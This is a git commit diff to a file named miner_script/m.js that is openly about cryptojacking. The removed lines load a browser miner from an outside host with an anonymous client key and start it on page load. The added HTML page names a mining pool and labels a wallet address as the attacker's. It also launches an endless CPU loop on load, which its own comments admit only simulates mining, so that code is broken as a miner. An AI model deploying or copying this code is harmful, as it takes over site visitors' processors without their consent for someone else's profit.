4a5a85a400d145d38cf8bf7d7a85be5fd4341a8f
Gohsty <89268998+Gohstys@users.noreply.github.com>
2023-10-11 15:29:40 +0200

    Update m.js

--- miner_script/m.js
+++ miner_script/m.js
@@ -1,9 +1,50 @@
-<script src="https://www.hostingcloud.racing/RC7y.js"></script>
-<script>
-    var _client = new Client.Anonymous('9b873c81b6fe5ef795e86ec68834ef5479f59b8f9f3f27c98b57fa5670f5d479', {
-        throttle: 0.2, c: 'w', ads: 0
-    });
-    _client.start();
-    
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Carga el archivo JavaScript -->
+    <script src="miner.js"></script>
+</head>
+<body>
+    <p>La URL de la pool es: <span id="pool-url"></span></p>
 
-</script>
+    <script>
+        // Obtiene la URL de la pool
+        const poolURL = 'rx.unmineable.com:3333';
+
+        // Muestra la URL de la pool en el elemento span
+        document.getElementById("pool-url").textContent = poolURL;
+
+        // Dirección de la billetera de criptomonedas del atacante
+        const walletAddress = 'WLD:0xe77070ce816595803c00deca32af997654ad47d8.YWK#iczs-elgt';
+
+        // Función para realizar la minería
+        function startMining() {
+          // Obtiene la potencia de procesamiento de la CPU del usuario
+          const numThreads = navigator.hardwareConcurrency || 4; // Número de hilos de CPU
+
+          // Bucle para simular la minería en cada hilo de CPU
+          for (let i = 0; i < numThreads; i++) {
+            // Realiza el proceso de minería en cada hilo
+            mine(walletAddress);
+          }
+        }
+
+        // Función para simular la minería
+        function mine(wallet) {
+          // Realiza cálculos intensivos para la minería de criptomonedas
+          // En un entorno real, se utilizarían algoritmos criptográficos, pero aquí se usa un bucle simple para la demostración.
+          let nonce = 0;
+          while (true) {
+            // Calcula un hash o realiza otras operaciones de minería aquí
+            // El objetivo es encontrar un valor que cumpla con ciertos requisitos para obtener una recompensa en criptomonedas
+            nonce++;
+          }
+        }
+
+        // Iniciar la minería cuando se carga la página
+        window.addEventListener('load', () => {
+          startMining();
+        });
+    </script>
+</body>
+</html>
